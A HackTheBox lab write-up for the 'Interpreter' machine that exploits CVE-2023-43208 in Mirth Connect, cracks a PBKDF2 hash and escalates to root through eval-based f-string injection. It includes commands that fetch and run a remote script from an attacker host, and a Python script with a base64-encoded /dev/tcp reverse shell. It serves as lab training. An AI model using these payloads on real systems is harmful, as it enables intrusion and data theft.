# Interpreter — HackTheBox Writeup

![HTB Badge](https://img.shields.io/badge/HackTheBox-Interpreter-green)

| Field      | Details              |
|------------|----------------------|
| **OS**     | Linux                |
| **IP**     | 10.129.55.240        |
| **Difficulty** | _[Medium]_ |
| **Topics** | Java Deserialization, CVE-2023-43208, Hash Cracking, Python Code Injection |

---

## 1. Recon

<img width="593" height="398" alt="image" src="https://github.com/user-attachments/assets/af68e88b-d4bd-4e74-b4dc-27b71276a0b7" />


```bash
nmap -sC -sV -oA interpreter 10.129.55.240
```

**Key findings:**
- Port 22 - SSH
- Port 80 - HTTP running **Mirth Connect 4.4.0**
- Port 443 - HTTPS running **Mirth Connect 4.4.0** Web Dashboard

Mirth Connect is an open-source healthcare integration engine. Seeing version 4.4.0 immediately prompted a CVE search.

---

## 2. Foothold — CVE-2023-43208 (Unauthenticated RCE)

### What is CVE-2023-43208?

Mirth Connect uses the **XStream library** to deserialize XML payloads into Java objects via its `XstreamSerializer` class. An earlier related vulnerability (CVE-2023-37679) exploited unsafe unmarshalling of an Invocation Handler — it was patched by adding a **deny list**.

However, researchers found another exploitable class, allowing the same deserialization primitive. The proper fix came later by switching to an **allow list** approach instead. CVE-2023-43208 affects versions below 4.4.1 and gives an **unauthenticated attacker remote code execution**.

### Exploitation

Using a public PoC, we staged the attack in two steps: first downloading a reverse shell script to the target, then executing it.

```bash
# Step 1 — deliver the payload
python3 cve-2023-43208-exploit.py -u https://10.129.55.240 \
  -c 'wget -O /tmp/r.sh http://10.10.16.219:8000/r1.sh'

# Step 2 — execute it
python3 cve-2023-43208-exploit.py -u https://10.129.55.240 \
  -c 'bash /tmp/r.sh'
```

<img width="661" height="129" alt="image-1" src="https://github.com/user-attachments/assets/2bbd8d02-d962-4432-8b9a-d2b6f087ad24" />


The exploit returns HTTP 500 — this is expected behavior; the payload executes despite the error response.

---

## 3. Post-Exploitation

### Database Credentials

With a shell as `mirth`, we found hardcoded database credentials in the Mirth Connect config directory:

```bash
mirth@interpreter:/usr/local/mirthconnect/conf$ mysql -u mirthdb -p'MirthPass123!' -D mc_bdd_prod
```

<img width="443" height="474" alt="image-2" src="https://github.com/user-attachments/assets/858ca2aa-8756-4fb7-a114-94eba2878f07" />

<img width="1272" height="274" alt="image-3" src="https://github.com/user-attachments/assets/ecaee1bc-ed6e-42c3-82f9-b647d558d6e2" />

<img width="846" height="142" alt="image-4" src="https://github.com/user-attachments/assets/549fa411-cfb5-46ed-9fb6-c9d56f30deb9" />


### Cracking the PBKDF2 Hash

Mirth Connect 4.4.0+ stores passwords using **PBKDF2** with SHA-256. The hash found in `PERSON_PASSWORD` is base64-encoded and structured as:

```
[8-byte salt][password hash]
```

To crack it with hashcat (mode `10900`), the format required is:

```
sha256:<iterations>:<salt_b64>:<hash_b64>
```

Default iterations for Mirth Connect 4.4.0 are **600,000**. Steps:
1. Hexify the base64-encoded hash
2. Take the first 16 hex chars (8 bytes) as the salt
3. Convert salt and hash back to base64
4. Feed to hashcat

```bash
hashcat -m 10900 hash.txt rockyou.txt
```

<img width="355" height="37" alt="image" src="https://github.com/user-attachments/assets/9f158b81-463e-4fe5-ac66-bb9ee4ce677a" />



### User Flag

With the cracked password, we SSH in as `sedric`:

```bash
ssh sedric@10.129.55.240
cat ~/user.txt
```

<img width="355" height="37" alt="image-6" src="https://github.com/user-attachments/assets/b0e2077e-f20c-4525-83b3-bfc63820d816" />


---

## 4. Privilege Escalation — Double F-String Injection in notify.py

### Discovery

While enumerating for a local privilege escalation path, we found `/usr/local/bin/notify.py` — a Flask service running as **root** on `127.0.0.1:54321`, accepting XML POST requests.

### The Vulnerability

The critical flaw is a **double f-string evaluation**:

```python
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, ..."
try:
    return eval(f"f'''{template}'''")
```

The first f-string builds a string that still contains `{...}` placeholders. That string is then passed to `eval()` as another f-string — meaning **any Python expression injected into the input fields gets evaluated by the interpreter**, hence the machine name.

The function does apply a regex to sanitize input:

```python
pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
```

This blocks spaces and special characters like `<`, `>`, and `&` — but not Python's `__import__` or base64 encoding, which gives us a bypass.

### Exploitation

**Step 1 — verify command execution:**

```python
import requests

data = """<patient>
  <firstname>{__import__('os').popen('id').read()}</firstname>
  <lastname>Doe</lastname>
  <sender_app>Mirth</sender_app>
  <timestamp>12345</timestamp>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>"""

r = requests.post("http://127.0.0.1:54321/addPatient", data=data)
print(r.text)
```

Response confirms execution as **root**.

**Step 2 — reverse shell via base64 to bypass the space/character restrictions:**

The payload `bash -i &> /dev/tcp/IP/PORT 0>&1` contains spaces and `>` — both blocked by the regex. Solution: base64-encode it.

```python
import requests

# base64 of: bash -c 'bash -i >& /dev/tcp/10.10.16.219/4444 0>&1'
b64_payload = "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMTkvNDQ0NCAwPiYxJw=="

data = f"""<patient>
  <firstname>{{__import__('os').system(__import__('base64').b64decode('{b64_payload}').decode())}}</firstname>
  <lastname>Doe</lastname>
  <sender_app>Mirth</sender_app>
  <timestamp>12345</timestamp>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>"""

r = requests.post("http://127.0.0.1:54321/addPatient", data=data)
print(r.text)
```

<img width="675" height="265" alt="image-7" src="https://github.com/user-attachments/assets/37e4974a-0a0f-41ce-b070-9149769a217e" />


```bash
nc -lvnp 4444
# root shell received
cat /root/root.txt
```

---

## 5. Key Takeaways

- **CVE-2023-43208** is a good example of an incomplete patch — switching from a deny list to an allow list is the correct fix for deserialization vulnerabilities. Deny lists will always be bypassable.
- **PBKDF2** is a strong hashing algorithm, but default iterations and weak passwords can still be cracked offline once you have database access. Credential hygiene matters.
- **Double f-string evaluation** is a subtle but dangerous antipattern in Python. Any time user input flows into `eval()`, even indirectly through a templating step, it's exploitable. The developer clearly intended the regex to be the security boundary — but regex is not a sandbox.
- Regex input validation that blocks spaces and special chars can often be bypassed with encoding (base64, hex, etc.) when the execution environment supports it.

---

*Writeup by Chirab678 — [May 14th, 2026]*
